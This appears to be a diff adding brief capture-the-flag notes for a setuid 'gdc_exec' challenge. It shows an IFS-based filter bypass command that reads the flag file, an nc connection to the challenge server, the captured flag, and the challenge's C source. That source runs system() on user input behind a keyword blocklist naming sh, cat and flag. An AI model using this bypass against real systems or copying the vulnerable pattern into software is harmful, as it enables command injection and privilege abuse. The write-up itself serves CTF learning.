@@ -1,0 +1,39 @@
+Theres stuff in bin folder
+lib folder is useless
+
+Useful Links
+https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces
+https://unix.stackexchange.com/questions/151807/how-to-pass-argument-with-spaces-to-a-shell-script-function
+
+export IFS=:
+./gdc_exec 'bin/tail${IFS%??}fla*'
+
+$ nc 13.213.195.207 60110 -v
+ec2-13-213-195-207.ap-southeast-1.compute.amazonaws.com [13.213.195.207] 60110 (?) open
+export IFS=:
+./gdc_exec 'bin/tail${IFS%??}fla*'
+CDDC21{You_Wi11_n3ver_st0p_u$}
+
+cat gdc_exec.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>                                                         #include <unistd.h>                                                         
+                                                                            int check_cmd(char* command)                                                {
+  int ret = 0;
+                                                                              for (int i = 0; command[i] != '\0'; i++)                                    {
+        if (command[i] == ' ') ret++;                                         }                                                                                                                                                       ret += strstr(command, "flag")!=0;                                          ret += strstr(command, "sh")!=0;                                            ret += strstr(command, "s\\h")!=0;                                          ret += strstr(command, "tmp")!=0;
+  ret += strstr(command, "cat")!=0;
+                                                                              return ret;
+}                                                                                                                                                       
+int main(int argc, char* argv[], char** envp)
+{
+  if (argc < 2) return 0;                                                     if (check_cmd(argv[1])) return 0;
+
+  setreuid(geteuid(), geteuid());
+
+  putenv("PATH=/whereami");
+  chdir("/tmp");
+                                                                              system(argv[1]);
+
+  return 0;
+}
